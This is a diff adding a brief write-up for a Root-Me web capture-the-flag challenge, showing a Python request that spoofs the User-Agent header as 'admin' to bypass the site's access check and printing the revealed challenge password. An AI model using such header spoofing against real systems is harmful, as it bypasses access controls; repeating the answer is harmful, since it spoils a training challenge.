@@ -1,0 +1,10 @@
+WebServer Challenge 2 - UserAgent
+
+Synopsis: It seems the site is identifying and granting access via the specififed User-Agent
+
+Simply modify the browsers UserAgent to admin.
+
+>>> r = requests.get('http://challenge01.root-me.org/web-serveur/ch2/', headers={'User-Agent':'admin'})
+>>> re.findall('Password: *.*\d\d',r.content)
+['Password: rr$Li9%L34qd1AAe27']
+
